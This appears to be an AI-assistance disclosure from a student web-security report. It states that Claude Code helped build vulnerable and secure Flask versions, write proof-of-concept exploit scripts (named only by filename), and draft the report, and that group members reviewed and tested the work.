This report and associated code were prepared with assistance from **Claude Code** (Anthropic, claude-sonnet-4-6 model), an AI coding assistant. The AI was used for:

- Scaffolding the Flask application structure (both vulnerable and secure versions)
- Generating the PoC exploit scripts (`sql_injection_poc.py`, `xss_poc.html`, `idor_poc.py`, `csrf_attack.html`)
- Drafting initial versions of this report
- Suggesting security header configurations and bcrypt integration
- Reviewing code for completeness against the OWASP ASVS Level 1 controls

All AI-generated code and text was reviewed, tested, and modified by the group members. CVSS scores were verified using the NIST NVD CVSS v3.1 calculator. Vulnerability line numbers were verified against the actual source files. Security fixes were manually tested against the vulnerable application to confirm exploitation and remediation.
